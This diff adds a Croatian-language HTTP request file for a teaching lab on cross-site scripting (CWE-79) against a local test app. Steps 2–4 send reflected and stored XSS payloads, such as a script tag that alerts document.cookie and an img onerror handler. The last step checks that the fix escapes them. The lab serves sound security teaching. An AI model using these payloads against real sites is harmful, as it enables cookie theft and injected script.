@@ -1,0 +1,35 @@
+### =====================================================================
+### Lab08 – A05 Injection: Cross-Site Scripting (CWE-79)
+### Upute: docs/labs/lab08-xss.md
+### Napomena: XSS se "vidi" tek u PREGLEDNIKU – URL-ove iz koraka 2) i 5) otvorite u Chromeu/Firefoxu.
+### =====================================================================
+@host = http://localhost:5080
+
+### 1) Legitimna pretraga
+GET {{host}}/lab08/search?q=Laptop
+
+### 2) NAPAD (reflektirani XSS): otvorite u pregledniku:
+###    http://localhost:5080/lab08/search?q=<script>alert(document.cookie)</script>
+GET {{host}}/lab08/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E
+
+### 3) NAPAD (reflektirani XSS bez <script>): http://localhost:5080/lab08/search?q=<img src=x onerror=alert('XSS')>
+GET {{host}}/lab08/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(%27XSS%27)%3E
+
+### 4) NAPAD (pohranjeni XSS): recenzija s HTML-om
+POST {{host}}/api/lab08/reviews
+Content-Type: application/json
+
+{"productId": 1, "author": "Napadač", "text": "<img src=x onerror=alert('XSS')>"}
+
+### 5) Stranica s recenzijama – otvorite u pregledniku: http://localhost:5080/lab08/products/1/reviews
+GET {{host}}/lab08/products/1/reviews
+
+### 6) Legitimna recenzija
+POST {{host}}/api/lab08/reviews
+Content-Type: application/json
+
+{"productId": 1, "author": "Ivana", "text": "Odličan proizvod, preporučujem."}
+
+### 7) PROVJERA POPRAVKA: odgovor sadrži &lt;script&gt; umjesto <script>, a zaglavlje
+###    Content-Security-Policy sadrži script-src
+GET {{host}}/lab08/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
